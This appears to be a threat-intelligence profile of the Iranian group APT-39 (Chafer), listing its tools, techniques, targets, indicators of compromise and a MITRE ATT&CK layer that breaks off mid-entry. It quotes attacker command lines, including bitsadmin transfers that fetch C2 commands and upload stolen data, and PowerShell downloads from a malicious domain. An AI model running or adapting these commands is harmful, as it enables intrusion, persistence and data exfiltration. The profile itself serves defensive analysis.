# APT-39

## Why APT-39 ?

APT-39 is attributed to Iran, the geopilitic context is interesting.

## Activity

active since at least 2015.

## Names

Chafer, REMIX KITTEN, COBALT HICKMAN, G0087, Radio Serpens

## Tools

1. Seaweed - Backdoor
2. CacheMoney - Backdoor
3. [Custom Powbat](https://apt.etda.or.th/cgi-bin/listgroups.cgi?t=POWBAT)
4. [Antak](https://www.kitploit.com/2014/06/antak-webshell-webshell-which-utilizes.html)
5. [ASPXSpy](https://attack.mitre.org/software/S0073)
6. [Cadelspy](https://attack.mitre.org/software/S0454)
7. [CrackMapExec](https://attack.mitre.org/software/S0488)
8. [MechaFlounder](https://attack.mitre.org/software/S0459)
9. [Mimikatz](https://attack.mitre.org/software/S0002)
10. [ftp](https://attack.mitre.org/software/S0095)
11. [NBTscan](https://attack.mitre.org/software/S0590)
12. [PsExec](https://attack.mitre.org/software/S0029)
13. [pwdump](https://attack.mitre.org/software/S0006)
14. [Remexi](https://attack.mitre.org/software/S0375/)
15. [Windows Credential Editor](https://attack.mitre.org/software/S0005/)
16. [Remcom](https://breakingsecurity.net/remcos/)
17. [NSSM](https://nssm.cc/)
18. [GNU HTTPTunnel](https://github.com/larsbrinkhoff/httptunnel)
19. [UltraVNC](https://en.wikipedia.org/wiki/UltraVNC)
20. [PuTTY Link](https://manpages.ubuntu.com/manpages/trusty/man1/plink.1.html)
21. [ProcDump](https://attack.mitre.org/techniques/T1003/001/)
22. [xCmdSvc](https://www.hybrid-analysis.com/sample/f5087d1d239d231d2e1bc228f8731ddef8f57446f81b32303c70fe7cba1f896d/563cb21c0e316d2075eef5a5)
23. REDTRIP - SOCKS5 proxy
24. PINKTRIP - SOCKS5 proxy
25. BLUETRIP - SOCKS5 proxy
26. [WinRAR](https://www.win-rar.com/start.html?&L=10)
27. [7-Zip](https://www.7-zip.org/)
28. BlueTorch - Network scan

## Techniques and tools

 - Spearphishing with malicious attachments and/or hyperlinks -> POWBAT infection
 - Domains
 - Web Shell
     - ANTAK (https://github.com/samratashok/nishang/blob/master/Antak-WebShell/antak.aspx)
         - execute PowerShell commands
     - ASPXSPY (https://github.com/tutorial0/WebShell/blob/master/Aspx/ASPXspy.aspx, https://github.com/tennc/webshell/blob/master/net-friend/aspx/aspxspy.aspx)
 - Steal and abuse outlook web credentials
 - Mechaflounder (C2 agent)
     - Get commands with HTML to text: https://stackoverflow.com/questions/328356/extracting-text-from-html-file-using-python/3987802#3987802
     - Commands: Terminate, download, runtime (sets sleep time between beacons), upload, cd, empty, \<exec\> (execute other strings as reverseshell)
     - Use base16
     - Use one socket for multiples requests and responses
     - `&m=d` => Chafer IOC (all chafer tools use this parameter)
 - Remexi (C2 spyware)
     - C2 on IIS using ASP
     - keylogger
     - screeenshot
     - browser data (cookie, history)
     - Lolbin
         - bitsadmin.exe (Fetches files from the C2 server to parse and execute commands. Send exfiltrated data) (https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)
         - extract.exe (Deploys modules from the .cab file into the working Event Cache directory)
         - taskkill.exe (Ends working cycle of modules)
         - schtasks.exe
     - Written in C with GCC && MinGW (IDE Qt Creator)
     - Use scheduled tasks and registry key (`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`, `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Activity Manager`)
     - XOR and RC4
         - RC4 with Win32 CryptoAPI and MD5 hash as an initial vector
         - Some time the key is `salamati`
     - Compiled files: operation_reg.c, thread_command.c, thread_upload.c
     - Steal credentials
     - Execute command
     - Generate planified tasks with custom XPTask.vbs to run `schtasks.exe /create /TN \"Events\\CacheTask_" /XML \"t /F"`
     - Commands:
         - search: Searches for corresponding files
         - search&upload: Encrypts and adds the corresponding files to the upload directory with the provided name
         - uploadfile: Encrypts and adds the specified file to the upload directory with the provided name
         - uploadfolder: Encrypts and adds the mentioned directory to the upload directory with the provided name
         - shellexecute: Silently executes received command with cmd.exe
         - wmic: Silently executes received command with wmic.exe (for WMI commands)
         - sendIEPass: Encrypts and adds all gathered browser data into files for upload to C2
         - uninstall: Removes files, directory and BITS tasks
     - Install with `HCK.cab` decompression, using command: `expand.exe -r \"\" -f:* \"\\\"`
     - Get C2 commands with: `bitsadmin.exe /TRANSFER HelpCenterDownload /DOWNLOAD /PRIORITY normal http:///asp.asp?ui=nrg--`
     - Exfiltration with: `bitsadmin.exe /TRANSFER HelpCenterUpload /UPLOAD /PRIORITY normal "/YP01__" ""`
 - Older than Remexi
     - AutoIT compiled as PE
     - Using FTP
     - Credentials hard coded
 - POWBAT
     - Macro -> scheduled task
     - dropped VBScript update.vbs
         1. PowerShell download from hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\dwn&m=d -> %PUBLIC%\Libraries\dn.
         2. PowerShell download BAT file from hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\bat&m=d -> %PUBLIC%\Libraries\dn.
         3. Executes the BAT file and stores the results in %PUBLIC%\Libraries\up.
         4. Uploads this file with HTTP POST request to hxxp://go0gIe[.]com/sysupdate.aspx?req=xxx\upl&m=u.
         5. PowerShell script dns.ps1, to exfiltrate data using DNS.
 - `schtasks.exe /create/ F /sc minute /mo 2 /tn "UpdatMachine" /tr %LOCALAPPDATA%\microsoft\Feed\Y658123.vbs`

### Mitre attack

 - Mechaflounder
     - T1059.007: JavaScript/JScript
     - T1059.004: Unix Shell
     - T1059.006: Python (PyInstaller, payload.pyc)
     - T1059.005: Visual Basic
     - T1057: Process Discovery
     - T1132: Data Encoding
     - T1105: Ingress Tool Transfer (Upload and Dowmload file)
     - T1094: Custom Command and Control Protocol

## Targets

 - Middle East, USA, Spain
 - telecommunications
 - travel industry (IT firms)
 - high-tech industry

### Goal

 - benefit nation-state decision making
 - geopolitical data
 - monitoring, tracking, or surveillance operations against specific individuals
 - collect proprietary or customer data for commercial or operational purposes
 - create additional accesses and vectors to facilitate future campaigns

## Developpers

1. Name: Mohamadreza New (https://www.fbi.gov/wanted/cyber/mohammed-reza-sabahi, https://www.fbi.gov/wanted/cyber/mohammad-reza-rezakhah)

## IOCs

 1. Hashs:
     - Mechaflounder: 0282b7705f13f9d9811b722f8d7ef8fef907bee2ef00bf8ec89df5e7d96d81ff
     - VBScript: 332fab21cb0f2f50774fccf94fc7ae905a21b37fe66010dcef6b71c140bb7fa1
     - AutoIT: 1b2fee00d28782076178a63e669d2306c37ba0c417708d4dc1f751765c3f94e1
     - events.exe:
         - b1fa803c19aa9f193b67232c9893ea57574a2055791b3de9f836411ce000ce31
         - 028515d12e9d59d272a2538045d1f636
         - 03055149340b7a1fd218006c98b30482
         - 25469ddaeff0dd3edb0f39bbe1dcdc46
         - 41b2339950d50cf678c0e5b34e68f537
         - 4bf178f778255b6e72a317c2eb8f4103
         - 7d1efce9c06a310627f47e7d70543aaf
         - 9f313e8ef91ac899a27575bc5af64051
         - aa6246dc04e9089e366cc57a447fc3a4
         - c981273c32b581de824e1fd66a19a281
         - dcb0ea3a540205ad11f32b67030c1e5a
     - Splitter.exe:
         - a77f9e441415dbc8a20ad66d4d00ae606faab370ffaee5604e93ed484983d3ff
         - c6721344af76403e9a7d816502dca1c8
         - d3a2b41b1cd953d254c0fc88071e5027
         - 1FF40E79D673461CD33BD8B68F8BB5B8
         - ecae141bb068131108c1cd826c82d88b
         - 12477223678e4a41020e66faebd3dd95
         - 460211f1c19f8b213ffaafcdda2a7295
         - 53e035273164f24c200262d61fa374ca
    - xCmdSvc.exe: f5087d1d239d231d2e1bc228f8731ddef8f57446f81b32303c70fe7cba1f896d
 2. Domains:
     - win10-update.com
     - vala.win7-update.com
     - turkiyeburslari.tk
     - xn--mgbfv9eh74d.com
     - eseses.tk
     - ytb.services
 3. IP addresses:
     - 185.177.59.70
     - 134.119.217.87 (https://www.abuseipdb.com/check/134.119.217.87, https://ipinfo.io/134.119.217.87/json)
     - 108.61.189.174
     - 107.191.62.45
     - 94.100.21.213
     - 89.38.97.112   
     - 148.251.197.113
     - 83.142.230.113
     - 87.117.204.113              
     - 89.38.97.115   
     - 87.117.204.115
     - 185.22.172.40
     - 92.243.95.203
     - 91.218.114.204
     - 86.105.227.224                              
     - 91.218.114.225
     - 134.119.217.84
 4. Filenames:
     - lsass.exe
         - downloaded from `http://win10-update.com/update.php?req=<redacted>&m=d`
         - send `GET <username>--<hostname>\<username>--<hostname>-service.html` (no `/` at the start and include `\`)
 5. Scheduled tasks:
     - CacheTask_\<user_name_here\>
 6. Directories:
     - `%APPDATA%\Microsoft\Event Cache`
 7. Registry keys
     - HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
     - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Activity Manager
     - HKCU\SOFTWARE\Microsoft\Fax
     - HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\PidRegData
     - HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\PidRegData
 8. URLs
     - http://\<server_ip_from_config\>/asp.asp?ui=\<host_name\>nrg-\<adapter_info\>-\<user_name\>
 9. Mutexes
     - Local\TEMPDAHCE01
     - Local\zaapr
     - Local\reezaaprLog
     - Local\\{Temp-00-aa-123-mr-bbbzz}

## Sources

1. [APT lists](https://www.mandiant.com/resources/insights/apt-groups)
2. [malpedia APT-39](https://malpedia.caad.fkie.fraunhofer.de/actor/apt39)
3. [mandiant APT-39](https://www.mandiant.com/resources/blog/apt39-iranian-cyber-espionage-group-focused-on-personal-information?_gl=1*am1ngh*_up*MQ..*_ga*NzEyMTcyNjA1LjE2OTg5MTU1Nzc.*_ga_X6642ZTDJ7*MTY5ODkxNTU3Ny4xLjAuMTY5ODkxNTU3Ny4wLjAuMA..)
4. [Radio Serpens PaloAlto](https://unit42.paloaltonetworks.com/atoms/radioserpens/)
5. [Antak WebShell](https://www.labofapenetrationtester.com/2014/06/introducing-antak.html)
6. [Mechaflounder/Chafer PaloAlto](https://unit42.paloaltonetworks.com/new-python-based-payload-mechaflounder-used-by-chafer/)
7. [Remexi/Chafer Kaspersky](https://securelist.com/chafer-used-remexi-malware/89538/)
8. [APT-39 Mitre attack](https://attack.mitre.org/groups/G0087/)
9. [chafer Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/chafer-latest-attacks-reveal-heightened-ambitions)

## Mitre attack

https://mitre-attack.github.io/attack-navigator//#layerURL=https%3A%2F%2Fattack.mitre.org%2Fgroups%2FG0087%2FG0087-enterprise-layer.json

```json
{
    "name": "APT39 (G0087)",
    "versions": {
        "attack": "14",
        "navigator": "4.9.0",
        "layer": "4.5"
    },
    "domain": "enterprise-attack",
    "description": "Enterprise techniques used by APT39, ATT&CK group G0087 (v3.1)",
    "filters": {
        "platforms": [
            "Linux",
            "macOS",
            "Windows",
            "Network",
            "PRE",
            "Containers",
            "Office 365",
            "SaaS",
            "Google Workspace",
            "IaaS",
            "Azure AD"
        ]
    },
    "sorting": 0,
    "layout": {
        "layout": "side",
        "aggregateFunction": "average",
        "showID": false,
        "showName": true,
        "showAggregateScores": false,
        "countUnscored": false,
        "expandedSubtechniques": "none"
    },
    "hideDisabled": false,
    "techniques": [
        {
            "techniqueID": "T1071",
            "tactic": "command-and-control",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1071.001",
            "tactic": "command-and-control",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used HTTP in communications with C2.(Citation: BitDefender Chafer May 2020)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1071.004",
            "tactic": "command-and-control",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used remote access tools that leverage DNS in communications with C2.(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1560",
            "tactic": "collection",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1560.001",
            "tactic": "collection",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used WinRAR and 7-Zip to compress an archive stolen data.(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1197",
            "tactic": "defense-evasion",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used the BITS protocol to exfiltrate stolen data from a compromised host.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1197",
            "tactic": "persistence",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used the BITS protocol to exfiltrate stolen data from a compromised host.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1547",
            "tactic": "persistence",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1547",
            "tactic": "privilege-escalation",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1547.001",
            "tactic": "persistence",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has maintained persistence using the startup folder.(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1547.001",
            "tactic": "privilege-escalation",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has maintained persistence using the startup folder.(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1547.009",
            "tactic": "persistence",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has modified LNK shortcuts.(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1547.009",
            "tactic": "privilege-escalation",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has modified LNK shortcuts.(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1110",
            "tactic": "credential-access",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used Ncrack to reveal credentials.(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1115",
            "tactic": "collection",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used tools capable of stealing contents of the clipboard.(Citation: Symantec Chafer February 2018)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1059",
            "tactic": "execution",
            "score": 1,
            "color": "",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has utilized AutoIt and custom scripts to perform internal reconnaissance.(Citation: FireEye APT39 Jan 2019)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1059.001",
            "tactic": "execution",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used PowerShell to execute malicious code.(Citation: BitDefender Chafer May 2020)(Citation: Symantec Chafer February 2018)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1059.005",
            "tactic": "execution",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has utilized malicious VBS scripts in malware.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1059.006",
            "tactic": "execution",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used a command line utility and a network scanner written in python.(Citation: BitDefender Chafer May 2020)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1136",
            "tactic": "persistence",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1136.001",
            "tactic": "persistence",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has created accounts on multiple compromised hosts to perform actions within the network.(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1555",
            "tactic": "credential-access",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used the Smartftp Password Decryptor tool to decrypt FTP passwords.(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1005",
            "tactic": "collection",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used various tools to steal files from the compromised host.(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1074",
            "tactic": "collection",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1074.001",
            "tactic": "collection",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has utilized tools to aggregate data prior to exfiltration.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1140",
            "tactic": "defense-evasion",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used malware to decrypt encrypted CAB files.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1546",
            "tactic": "privilege-escalation",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1546",
            "tactic": "persistence",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1546.010",
            "tactic": "privilege-escalation",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used malware to set LoadAppInit_DLLs in the Registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows in order to establish persistence.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1546.010",
            "tactic": "persistence",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used malware to set LoadAppInit_DLLs in the Registry key SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows in order to establish persistence.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1041",
            "tactic": "exfiltration",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has exfiltrated stolen victim data through C2 communications.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1190",
            "tactic": "initial-access",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used SQL injection for initial compromise.(Citation: Symantec Chafer February 2018)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1083",
            "tactic": "discovery",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used tools with the ability to search for files on a compromised host.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1070",
            "tactic": "defense-evasion",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1070.004",
            "tactic": "defense-evasion",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used malware to delete files after they are deployed on a compromised host.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1105",
            "tactic": "command-and-control",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has downloaded tools to compromised hosts.(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1056",
            "tactic": "collection",
            "score": 1,
            "color": "",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has utilized tools to capture mouse movements.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1056",
            "tactic": "credential-access",
            "score": 1,
            "color": "",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has utilized tools to capture mouse movements.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1056.001",
            "tactic": "collection",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used tools for capturing keystrokes.(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1056.001",
            "tactic": "credential-access",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used tools for capturing keystrokes.(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1036",
            "tactic": "defense-evasion",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1036.005",
            "tactic": "defense-evasion",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used malware disguised as Mozilla Firefox and a tool named mfevtpse.exe to proxy C2 communications, closely mimicking a legitimate McAfee file mfevtps.exe.(Citation: BitDefender Chafer May 2020)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1046",
            "tactic": "discovery",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used [CrackMapExec](https://attack.mitre.org/software/S0488) and a custom port scanner known as BLUETORCH for network scanning.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1135",
            "tactic": "discovery",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used the post exploitation tool [CrackMapExec](https://attack.mitre.org/software/S0488) to enumerate network shares.(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1027",
            "tactic": "defense-evasion",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used malware to drop encrypted CAB files.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1027.002",
            "tactic": "defense-evasion",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has packed tools with UPX, and has repacked a modified version of [Mimikatz](https://attack.mitre.org/software/S0002) to thwart anti-virus detection.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1588",
            "tactic": "resource-development",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1588.002",
            "tactic": "resource-development",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has modified and used customized versions of publicly-available tools like PLINK and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: BitDefender Chafer May 2020)(Citation: IBM ITG07 June 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1003",
            "tactic": "credential-access",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used different versions of Mimikatz to obtain credentials.(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1003.001",
            "tactic": "credential-access",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials.(Citation: FireEye APT39 Jan 2019)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1566",
            "tactic": "initial-access",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1566.001",
            "tactic": "initial-access",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) leveraged spearphishing emails with malicious attachments to initially compromise victims.(Citation: FireEye APT39 Jan 2019)(Citation: Symantec Chafer February 2018)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1566.002",
            "tactic": "initial-access",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) leveraged spearphishing emails with malicious links to initially compromise victims.(Citation: FireEye APT39 Jan 2019)(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1090",
            "tactic": "command-and-control",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1090.001",
            "tactic": "command-and-control",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) used custom tools to create SOCK5 and custom protocol proxies between infected hosts.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1090.002",
            "tactic": "command-and-control",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used various tools to proxy C2 communications.(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1012",
            "tactic": "discovery",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used various strains of malware to query the Registry.(Citation: FBI FLASH APT39 September 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": false
        },
        {
            "techniqueID": "T1021",
            "tactic": "lateral-movement",
            "color": "",
            "comment": "",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1021.001",
            "tactic": "lateral-movement",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has been seen using RDP for lateral movement and persistence, in some cases employing the rdpwinst tool for mangement of multiple sessions.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1021.002",
            "tactic": "lateral-movement",
            "score": 1,
            "color": "#66b1ff",
            "comment": "[APT39](https://attack.mitre.org/groups/G0087) has used SMB for lateral movement.(Citation: Symantec Chafer February 2018)",
            "enabled": true,
            "metadata": [],
            "links": [],
            "showSubtechniques": true
        },
        {
            "techniqueID": "T1021.004",
            "tactic": "lateral-movement",
            "score": 1,
            "color": "#66b1ff",
